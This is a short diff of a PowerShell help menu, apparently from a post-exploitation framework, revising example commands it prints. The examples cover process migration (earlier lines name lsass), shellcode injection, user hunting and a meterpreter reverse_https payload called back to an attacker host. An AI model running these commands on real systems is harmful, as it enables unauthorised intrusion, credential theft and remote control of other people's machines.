@@ -608,11 +608,11 @@ $header = '
         write-host " Invoke-UserHunter -StopOnSuccess" -ForegroundColor Green
         write-host " Migrate-x64" -ForegroundColor Green
         write-host " Migrate-x64 -ProcID 4444" -ForegroundColor Green
-        write-host " Migrate-x64 -NewProcess C:\Windows\System32\netsh.exe" -ForegroundColor Green
-        write-host " Migrate-x86 -ProcName lsass" -ForegroundColor Green
+        write-host " Migrate-x64 -ProcessPath C:\Windows\System32\cmd.exe" -ForegroundColor Green
+        write-host " Migrate-x86 -ProcessPath C:\Windows\System32\cmd.exe" -ForegroundColor Green
         write-host " Migrate-Proxy-x86 -ProcID 4444" -ForegroundColor Green
-        write-host " Migrate-Proxy-x64 -ProcName notepad" -ForegroundColor Green
-        write-host " Migrate-Daisy-x86 -Name DC1" -ForegroundColor Green
+        write-host " Migrate-Proxy-x64 -ProcID 444" -ForegroundColor Green
+        write-host " Migrate-Daisy-x86 -Name DC1  -ProcID 444" -ForegroundColor Green
         write-host " Migrate-Daisy-x64 -Name DC2" -ForegroundColor Green
         write-host " Inject-Shellcode -x86 -Shellcode (GC C:\Temp\Shellcode.bin -Encoding byte) -ProcID 5634" -ForegroundColor Green
         write-host " Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 172.16.0.100 -Lport 443 -Force" -ForegroundColor Green
